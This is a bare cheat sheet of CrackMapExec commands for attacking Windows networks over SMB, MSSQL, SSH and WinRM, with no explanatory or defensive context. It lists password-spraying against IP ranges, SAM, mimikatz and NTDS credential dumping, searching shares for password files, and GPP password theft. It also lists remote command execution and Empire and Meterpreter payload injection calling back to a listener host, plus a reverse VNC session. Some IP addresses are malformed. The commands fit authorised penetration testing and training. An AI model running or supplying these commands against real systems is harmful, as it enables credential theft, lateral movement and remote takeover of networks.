# CrackmapExec CheatSheet

    cme smb 172.16.164.10-15
    cme smb 172.16.164.10-15 -u user -p P@ssw0rd
    cme smb 172.16.164.10-15 -u user -p P@ssw0rd --sam
    cme smb 172.16.164.10-15 -u user -p P@ssw0rd -x whoami
    cme smb 172.16.164.10-15 -u user -p p@ssword -L #list modules
    cme smb 172.16.164.10-15 -u user -p p@ssword -M mimikatz
    cmedb
    cmedb > creds
    cmedb > hosts
    cmedb > hosts <id>
    cme smb 172.15.164.10 -u user2 -p 'P@ssw0rd' --groups
    cme smb 172.15.164.10 -u user2 -p 'P@ssw0rd' --groups 'Domain Admins'
    cmedb > groups
    cme smb 172.15.164.10.10-15 -u user2 -p 'P@ssw0rd' --shares
    cme smb 172.15.164.10.11 -u user2 -p 'P@ssw0rd' --spider dontlook --pattern pass
    cme smb 172.15.164.10.11 -u user2 -p 'P@ssw0rd' --spider dontlook --pattern pass --content
    cme smb 172.15.164.10.11 -u user2 -p 'P@ssw0rd' -M gpp_password
    
    cme smb -M empire_exec --options
    cme smb 172.16.16.10.15 -u Administrator -p 'P@ssw0rd' -M empire_exec -o LISTENER=http
    cme smb -M met_inject --options
    cme smb 172.16.164.10-20 -u Administrator -p 'P@ssword' -M met_inject -o LHOST=172.16.164.1 LPORT=9090

    cme mssql 172.16.164.10-15
    cme mssql 172.16.164.11 -u Administrator -p 'P@ssword' -x ipconfig
    cme mssql 172.16.164.11 -u Administrator -p 'P@ssword' -M mimikatz

----------

    vncviewer --listen
    cme mssql 172.16.164.11 -u Administrator -p 'P@ssword' -M invoke_vnc
    cme mssql 172.16.164.11 -u Administrator -p 'P@ssword' -M invoke_vnc --options
    cme mssql 172.16.164.11 -u Administrator -p 'P@ssword' -M invoke_vnc --o PORT=5500 PASSWORD=demo

----------

    cme ssh 172.16.164.10/24

----------

    cme winrm 172.16.164.0/24 #wsman?
    cme winrm 172.16.164.0/24 -u Administrator -p P@ssword
    cme winrm 172.16.164.0/24 -u Administrator -p P@ssword -x whoami
    cme winrm 172.16.164.0/24 -u Administrator -p P@ssword --ntdis #via DNSSync

